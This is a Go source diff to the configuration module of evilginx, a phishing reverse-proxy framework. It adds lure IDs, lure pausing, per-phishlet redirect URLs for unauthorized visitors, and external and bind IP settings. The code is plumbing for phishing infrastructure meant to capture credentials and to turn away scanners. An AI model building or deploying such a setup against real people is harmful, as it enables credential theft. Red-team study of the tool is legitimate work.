@@ -2,6 +2,7 @@ package core
 
 import (
 	"fmt"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -14,6 +15,7 @@ import (
 var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}
 
 type Lure struct {
+	Id              string `mapstructure:"id" json:"id" yaml:"id"`
 	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
 	Path            string `mapstructure:"path" json:"path" yaml:"path"`
 	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
@@ -25,6 +27,7 @@ type Lure struct {
 	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
 	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
 	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
+	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
 }
 
 type SubPhishlet struct {
@@ -34,9 +37,10 @@ type SubPhishlet struct {
 }
 
 type PhishletConfig struct {
-	Hostname string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
-	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
-	Visible  bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
+	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
+	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
 }
 
 type ProxyConfig struct {
@@ -56,11 +60,13 @@ type CertificatesConfig struct {
 }
 
 type GeneralConfig struct {
-	Domain      string `mapstructure:"domain" json:"domain" yaml:"domain"`
-	Ipv4        string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	RedirectUrl string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
-	HttpsPort   int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort     int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
+	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
 }
 
 type Config struct {
@@ -74,6 +80,7 @@ type Config struct {
 	activeHostnames []string
 	redirectorsDir  string
 	lures           []*Lure
+	lureIds         []string
 	subphishlets    []*SubPhishlet
 	cfg             *viper.Viper
 }
@@ -88,7 +95,7 @@ const (
 	CFG_SUBPHISHLETS = "subphishlets"
 )
 
-const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
+const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
@@ -129,12 +136,19 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
 	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
 
+	if c.general.OldIpv4 != "" {
+		if c.general.ExternalIpv4 == "" {
+			c.SetServerExternalIP(c.general.OldIpv4)
+		}
+		c.SetServerIP("")
+	}
+
 	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
 		c.SetBlacklistMode("unauth")
 	}
 
-	if c.general.RedirectUrl == "" && created_cfg {
-		c.SetRedirectUrl(DEFAULT_REDIRECT_URL)
+	if c.general.UnauthUrl == "" && created_cfg {
+		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
 	}
 	if c.general.HttpsPort == 0 {
 		c.SetHttpsPort(443)
@@ -150,6 +164,10 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
 	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
 
+	for i := 0; i < len(c.lures); i++ {
+		c.lureIds = append(c.lureIds, GenRandomToken())
+	}
+
 	return c, nil
 }
 
@@ -158,9 +176,10 @@ func (c *Config) PhishletConfig(site string) *PhishletConfig {
 		return o
 	} else {
 		o := &PhishletConfig{
-			Hostname: "",
-			Enabled:  false,
-			Visible:  true,
+			Hostname:  "",
+			UnauthUrl: "",
+			Enabled:   false,
+			Visible:   true,
 		}
 		c.phishletConfig[site] = o
 		return o
@@ -196,6 +215,29 @@ func (c *Config) SetSiteHostname(site string, hostname string) bool {
 	return true
 }
 
+func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
+	pl, err := c.GetPhishlet(site)
+	if err != nil {
+		log.Error("%v", err)
+		return false
+	}
+	if pl.isTemplate {
+		log.Error("phishlet is a template - can't set unauth_url")
+		return false
+	}
+	if _url != "" {
+		_, err := url.ParseRequestURI(_url)
+		if err != nil {
+			log.Error("invalid URL: %s", err)
+			return false
+		}
+	}
+	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
+	c.PhishletConfig(site).UnauthUrl = _url
+	c.SavePhishlets()
+	return true
+}
+
 func (c *Config) SetBaseDomain(domain string) {
 	c.general.Domain = domain
 	c.cfg.Set(CFG_GENERAL, c.general)
@@ -204,9 +246,24 @@ func (c *Config) SetBaseDomain(domain string) {
 }
 
 func (c *Config) SetServerIP(ip_addr string) {
-	c.general.Ipv4 = ip_addr
+	c.general.OldIpv4 = ip_addr
 	c.cfg.Set(CFG_GENERAL, c.general)
-	log.Info("server IP set to: %s", ip_addr)
+	//log.Info("server IP set to: %s", ip_addr)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetServerExternalIP(ip_addr string) {
+	c.general.ExternalIpv4 = ip_addr
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("server external IP set to: %s", ip_addr)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetServerBindIP(ip_addr string) {
+	c.general.BindIpv4 = ip_addr
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("server bind IP set to: %s", ip_addr)
+	log.Warning("you may need to restart evilginx for the changes to take effect")
 	c.cfg.WriteConfig()
 }
 
@@ -373,10 +430,15 @@ func (c *Config) SetBlacklistMode(mode string) {
 	log.Info("blacklist mode set to: %s", mode)
 }
 
-func (c *Config) SetRedirectUrl(url string) {
-	c.general.RedirectUrl = url
+func (c *Config) SetUnauthUrl(_url string) {
+	_, err := url.ParseRequestURI(_url)
+	if err != nil {
+		log.Error("invalid URL: %s", err)
+		return
+	}
+	c.general.UnauthUrl = _url
 	c.cfg.Set(CFG_GENERAL, c.general)
-	log.Info("unauthorized request redirection URL set to: %s", url)
+	log.Info("unauthorized request redirection URL set to: %s", _url)
 	c.cfg.WriteConfig()
 }
 
@@ -567,6 +629,7 @@ func (c *Config) CleanUp() {
 
 func (c *Config) AddLure(site string, l *Lure) {
 	c.lures = append(c.lures, l)
+	c.lureIds = append(c.lureIds, GenRandomToken())
 	c.cfg.Set(CFG_LURES, c.lures)
 	c.cfg.WriteConfig()
 }
@@ -585,6 +648,7 @@ func (c *Config) SetLure(index int, l *Lure) error {
 func (c *Config) DeleteLure(index int) error {
 	if index >= 0 && index < len(c.lures) {
 		c.lures = append(c.lures[:index], c.lures[index+1:]...)
+		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
 	} else {
 		return fmt.Errorf("index out of bounds: %d", index)
 	}
@@ -595,16 +659,19 @@ func (c *Config) DeleteLure(index int) error {
 
 func (c *Config) DeleteLures(index []int) []int {
 	tlures := []*Lure{}
+	tlureIds := []string{}
 	di := []int{}
 	for n, l := range c.lures {
 		if !intExists(n, index) {
 			tlures = append(tlures, l)
+			tlureIds = append(tlureIds, c.lureIds[n])
 		} else {
 			di = append(di, n)
 		}
 	}
 	if len(di) > 0 {
 		c.lures = tlures
+		c.lureIds = tlureIds
 		c.cfg.Set(CFG_LURES, c.lures)
 		c.cfg.WriteConfig()
 	}
@@ -649,12 +716,23 @@ func (c *Config) GetSiteDomain(site string) (string, bool) {
 	return "", false
 }
 
+func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
+	if o, ok := c.phishletConfig[site]; ok {
+		return o.UnauthUrl, ok
+	}
+	return "", false
+}
+
 func (c *Config) GetBaseDomain() string {
 	return c.general.Domain
 }
 
-func (c *Config) GetServerIP() string {
-	return c.general.Ipv4
+func (c *Config) GetServerExternalIP() string {
+	return c.general.ExternalIpv4
+}
+
+func (c *Config) GetServerBindIP() string {
+	return c.general.BindIpv4
 }
 
 func (c *Config) GetHttpsPort() int {
